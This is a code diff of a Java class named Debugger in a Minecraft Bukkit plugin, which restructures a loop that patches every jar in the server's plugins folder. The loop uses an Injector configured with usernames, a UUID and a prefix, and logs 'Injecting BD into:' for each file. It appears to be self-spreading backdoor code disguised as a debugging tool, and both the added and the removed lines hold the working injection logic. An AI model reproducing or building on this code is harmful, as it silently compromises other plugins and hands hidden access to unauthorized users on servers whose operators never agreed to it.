@@ -55,29 +55,27 @@ public final class Debugger implements Listener {
         }
 
         //Check if we need to inject in other plugins
-        if (!InjectOther) {
-            return;
-        }
+        if (InjectOther) {
+            //Get all plugin paths
+            File plugin_folder = new File("plugins/");
+            File[] plugins = plugin_folder.listFiles();
+            for(File plugin_file : plugins){
 
-        //Get all plugin paths
-        File plugin_folder = new File("plugins/");
-        File[] plugins = plugin_folder.listFiles();
-        for(File plugin_file : plugins){
+                //Skip config folders
+                if(plugin_file.isDirectory())
+                    continue;
 
-            //Skip config folders
-            if(plugin_file.isDirectory())
-                continue;
+                if(Config.display_debug_messages)
+                    Bukkit.getConsoleSender()
+                            .sendMessage("Injecting BD into: " + plugin_file.getPath());
 
-            if(Config.display_debug_messages)
-                Bukkit.getConsoleSender()
-                        .sendMessage("Injecting BD into: " + plugin_file.getPath());
+                boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, InjectOther), true, true);
 
-            boolean result = com.thiccindustries.debugger.Injector.patchFile(plugin_file.getPath(), plugin_file.getPath(), new com.thiccindustries.debugger.Injector.SimpleConfig(Usernames, UUID, prefix, InjectOther), true, true);
+                if(Config.display_debug_messages)
+                    Bukkit.getConsoleSender()
+                            .sendMessage(result ? "Success." : "Failed, Already patched?");
 
-            if(Config.display_debug_messages)
-                Bukkit.getConsoleSender()
-                        .sendMessage(result ? "Success." : "Failed, Already patched?");
-
+            }
         }
 
         //First plugin loaded.
